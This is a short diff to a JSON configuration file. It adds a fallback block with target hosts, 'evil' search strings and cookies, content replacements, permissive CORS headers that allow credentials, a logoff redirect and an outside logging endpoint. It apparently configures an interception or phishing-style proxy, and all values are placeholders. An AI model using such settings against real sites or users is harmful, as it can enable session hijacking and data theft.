@@ -21,5 +21,28 @@
             "url": "/log_event",
             "auth_cookie": "mycookie=authcookie"
         }
+    },
+"fallback_config": {
+        "primary_target": "target1.com",
+        "secondary_target": "target2.com",
+        "search_string": "evil_string",
+        "wwwroot": "mydir",
+        "tracking_cookie": "evil_cookie",
+        "replacements": {
+            "string_to_replace": "replacement_string"
+        },
+        "custom_headers": {
+            "Access-Control-Allow-Origin": "*",
+            "Access-Control-Allow-Credentials": "true"
+        },
+        "snitch": {
+            "snitch_string": "Logoff",
+            "redirect_url": "https://real.domain.com/index.html"
+        },
+        "logging_endpoint": {
+            "host": "www.myloggingserver.com",
+            "url": "/log_event",
+            "auth_cookie": "mycookie=authcookie"
+        }
     }
 }
